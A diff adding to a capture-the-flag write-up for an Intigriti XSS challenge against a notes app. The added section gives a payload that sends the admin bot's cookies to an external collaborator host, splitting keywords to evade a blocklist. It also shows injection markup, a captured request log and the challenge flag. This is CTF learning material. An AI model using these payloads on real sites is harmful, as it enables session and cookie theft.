@@ -1,9 +1,12 @@
 # Intigriti April 2026 Challenge — Northstar Notes XSS
 
+**Flag**: `INTIGRITI{019d955f-1643-77a6-99ef-1c10975ab284}`
+
 ## Challenge Overview
 
 **URL**: `https://challenge-0426.intigriti.io/challenge`  
-**Goal**: Trigger `alert(document.domain)` via XSS with at most 1 user interaction, no self-XSS, latest Chrome.
+**Goal**: Trigger `alert(document.domain)` via XSS with at most 1 user interaction, no self-XSS, latest Chrome.  
+**Hint**: "The settings page saves more than it shows." / "steal admin flag"
 
 Northstar Notes is a note-taking app that supports rich HTML content, user preferences, and multiple "panel" layouts for viewing notes. The application sanitizes note content with DOMPurify 3.4.0 and enforces a strict Content Security Policy.
 
@@ -298,3 +301,46 @@ print(f"\n[*] Exploit URL: {BASE}{exploit_path}")
 | 5 | DOMPurify `full` mode preserves `data-*` attributes | XSS payload attributes survive sanitization |
 | 6 | `postSanitize` regex bypass via string concatenation | `self['ale'+'rt']` evades keyword blocklist |
 | 7 | `loadCustomWidget` creates script under `strict-dynamic` | Arbitrary JavaScript execution |
+
+## Stealing the Admin Flag
+
+The challenge requires stealing a flag from the admin bot's cookies. The `postSanitize` regex blocks `fetch`, `XMLHttp`, `document`, and `cookie`, but we can bypass all of them:
+
+```javascript
+new Image().src='https://COLLABORATOR_URL/?c='+self['docu'+'ment']['coo'+'kie']
+```
+
+- `Image` constructor is not blocked
+- `document` → `self['docu'+'ment']`
+- `cookie` → `['coo'+'kie']`
+- No `fetch` or `XMLHttpRequest` needed
+
+### Exfiltration Steps
+
+**Step 1**: Create note with exfiltration payload:
+
+```html
+<div id="enhance-config" data-types="custom"></div>
+<div data-enhance="custom" data-cfg="new Image().src='https://COLLABORATOR/?c='+self['docu'+'ment']['coo'+'kie']"></div>
+```
+
+**Step 2**: Report the path-traversal URL to the admin bot.
+
+**Step 3**: Admin bot visits → XSS fires → `new Image()` sends cookies to attacker server.
+
+### Captured Flag
+
+Burp Collaborator received:
+
+```http
+GET /?c=flag=INTIGRITI{019d955f-1643-77a6-99ef-1c10975ab284};%20northstar_profile=eadc66ebca0cbd5846c408cfae0ce38a HTTP/1.1
+Host: 615b63h3rwiex74fvh4c2bnjbah05p.oastify.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/147.0.0.0 Safari/537.36
+```
+
+**Flag**: `INTIGRITI{019d955f-1643-77a6-99ef-1c10975ab284}`
+
+## Screenshots
+
+![Challenge Page](screenshots/02-challenge-page.png)
+![Exploit Page](screenshots/03-exploit-page.png)
